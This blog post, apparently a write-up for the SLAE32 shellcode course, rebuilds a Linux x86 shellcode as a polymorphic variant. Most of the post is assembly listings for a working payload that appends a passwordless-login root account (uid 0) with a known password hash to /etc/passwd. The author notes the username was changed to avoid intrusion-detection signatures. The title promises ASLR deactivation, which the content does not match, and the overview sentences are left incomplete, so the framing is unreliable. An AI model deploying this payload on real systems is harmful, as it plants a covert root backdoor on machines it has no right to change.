---
title: SLAE32 Assignment 6.2 - Polymorphic ASLR Deactivation
date: 2019-9-19
layout: single
classes: wide
tags:
  - Bind
  - Shell
  - Assembly
  - Code
  - SLAE
  - Linux
  - x86
  - Shellcode
--- 
![](/assets/images/SLAE32.png)
## Overview
This shellcode is a polymorphic version of 
The final polymorphic version of the shellcode is 
The original shellcode can be found at: 

## Analyzing the Shellcode
To begin to create a polymorphic version of this shellcode I first had to understand it. Since there was only the hex of the shellcode in the post,  I reverse engineered the hex and created this mock-up of the original Assembly Instructions.  
#### Mock-up of Original Shellcode
```console
global _start
section .text
_start:
  jmp short jmp2call        ; jump2call so we can get the string location on the stack.
string2stack:
  pop esi                   ; pop memory location of string "/bin/sh#-c#/bin/echo.." into esi
  xor eax, eax              ; clear out eax register
  mov byte [esi +7], al     ; Null byte to terminate string "/bin/sh"
  mov byte [esi +10], al    ; Null byte to terminate string "-c"
  mov byte [esi +71], al    ; Null byte to terminate string
                            ; "/bin/echo w000t::0:0:s4fem0de:/root:/bin/bash >> /etc/passwd"
  mov dword [esi +73], esi  ; argv[] array start. Memory pointer to string "/bin/sh"
  lea ebx, [esi +8]         ; move pointer to string "-c" into ebx register
  mov dword [esi +77], ebx  ; argv[] 2nd arg. Memory location of "-c" anfter first string,
  lea ebx, [esi +11]        ; move pointer to string "/bin/echo..." into ebx register
  mov dword [esi +81], ebx  ; argv[] 3rd arg. Mem location to "/bin/echo.." string
  mov dword [esi +85], eax  ; argv[] Null dword terminator.
  mov al, 0xb               ; 11 - syscall for execve
  mov ebx, esi              ; location of string "/bin/sh" for program filename
  lea ecx, [esi +73]        ; argv pointers to args
  lea edx, [esi +85]        ; fill edx with null dword
  int 0x80                  ; executes execve systemcall
jmp2call:
  call string2stack         ; jumps 2 next instruction and pushes memory location of string
                            ; below onto the stack.
  string db "/bin/sh#-c#/bin/echo w000t::0:0:s4fem0de:/root:/bin/bash >> /etc/passwd#AAAABBBBCCCCDDDD"
;            0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567
;                      1         2         3         4         5         6         7         8
```
+ The code was compiled and tested. It works as intended.
+ To find the intructions gdb was used. 

### Problem with this Shellcode
+ When this shellcode was created, linux systems would allow an account with no password to be logged in by anyone.
+ Modern Linux systems, even ubuntu 14, will lock the account if it has no password.
+ Any attempt to login will recieve the error "Authentication Failure".

#### Creating a Hashed Password for /etc/passwd
```console
user$ openssl passwd ctl
NNwZ8D1QjVy3Y
```
+ This creates the hash for the password "ctl". 
+ This will be used in the second field of the users line in the "/etc/passwd" file.

#### w000t username
+ "w00t" or w000t" has been used countless times in exploits.
+ Highly likely an IPS/IDS will flag this string.
+ the username ctl was used instead.

## Changing the Shellcode

### argv[]/ecx - Stack over Code Section
In the original shellcode, JMP|Call|POP was used to load the memory address of the string into the esi register. All pointers to fufill the execve arguements were at this memory location.  
In the polymorphic version, all of the arguements for argv[] were instead loaded onto the stack.

#### argv[4] - End the argv[] Array
```nasm
  xor eax, eax              ; clear out eax register
snip--
  push eax                  ; push to stack argv[] Null dword array terminator.
```

#### argv[2] - Arguements to Flag
```nasm
  mov byte [esi +61], al    ; Null byte to terminate string
                            ;  "/bin/echo ctl:NNwZ8D1QjVy3Y:0:0::/:/bin/sh >> /etc/passwd#"
  lea ebx, [esi +3]         ; move pointer to string "/bin/echo..." into ebx register
  push ebx                  ; argv[] 3rd arg. Mem location to "/bin/echo.." string
```

#### argv[1] - Flag of Program
  mov byte [esi +2], al     ; Null byte to terminate string "-c"
  lea ebx, [esi]            ; move pointer to string "-c" into ebx register
  push ebx                  ; argv[] 2nd arg. Memory location of "-c" anfter first string,

#### argv[0] - Pointer to Program Path
```nasm
  push eax                  ; push to null terminator for string "/bin//sh" on the stack.
  push dword [esi +42]      ; push "//sh" onto the stack.
  push dword [esi +38]      ; push "/bin" onto the stack.
  lea ecx, [esp]            ; save for later for ebx
snip--
  mov ebx, ecx              ; memory address of "/bin//sh" on the stack
  push ebx                  ; argv[] array start. Memory pointer to string "/bin/sh"
snip--
  mov ecx, esp              ; point ecx to top of stack
```

### Reuse the "/bin//sh" in the string memory
+ Since the program already has the filename path of the program we are running with execve there was no need to have it twice.
+ The piece of the string was changed from "/bin/sh" to "/bin//sh"
  - This was to fit the string into 2 DWORD's.
  - These DWORD's were pushed to the stack.

```nasm
  xor eax, eax              ; clear out eax register
  push eax                  ; push to null terminator for string "/bin//sh" on the stack.
  push dword [esi +42]      ; push "//sh" onto the stack.
  push dword [esi +38]      ; push "/bin" onto the stack.
  lea ecx, [esp]            ; save for later for ebx
snip--
  mov ebx, ecx              ; memory address of "/bin//sh" on the stack
```

## Final Polymorphic Shellcode
```nasm
global _start
section .text
_start:
  jmp short jmp2call        ; jump2call so we can get the string location on the stack.
string2stack:
  pop esi                   ; pop memory location of string "/bin/sh#-c#/bin/echo.." into esi
  xor eax, eax              ; clear out eax register
  push eax                  ; push to null terminator for string "/bin//sh" on the stack.
  lea edx, [esp]            ; fill edx with pointer to null dword
  push dword [esi +42]      ; push "//sh" onto the stack.
  push dword [esi +38]      ; push "/bin" onto the stack.
  lea ecx, [esp]            ; save for later for ebx
  mov byte [esi +2], al     ; Null byte to terminate string "-c"
  mov byte [esi +61], al    ; Null byte to terminate string
                            ;  "/bin/echo ctl:NNwZ8D1QjVy3Y:0:0::/:/bin/sh >> /etc/passwd#"
  push eax                  ; push to stack argv[] Null dword array terminator.
  lea ebx, [esi +3]         ; move pointer to string "/bin/echo..." into ebx register
  push ebx                  ; argv[] 3rd arg. Mem location to "/bin/echo.." string
  lea ebx, [esi]            ; move pointer to string "-c" into ebx register
  push ebx                  ; argv[] 2nd arg. Memory location of "-c" anfter first string,
  mov ebx, ecx              ; memory address of "/bin//sh" on the stack
  push ebx                  ; argv[] array start. Memory pointer to string "/bin/sh"
  mov ecx, esp              ; point ecx to top of stack
  mov al, 0xb               ; 11 - syscall for execve
  int 0x80                  ; executes execve systemcall

jmp2call:
  call string2stack         ; jumps 2 next instruction and pushes memory location of string
                            ; below onto the stack.
  string db "-c#/bin/echo ctl:NNwZ8D1QjVy3Y:0:0::/:/bin//sh >> /etc/passwd"
;            01234567890123456789012345678901234567890123456789012345678901
;                      1         2         3         4         5         6

; string db "/bin/sh#-c#/bin/echo ctl:NNwZ8D1QjVy3Y:0:0::/:/bin/sh >> /etc/passwd#"
```

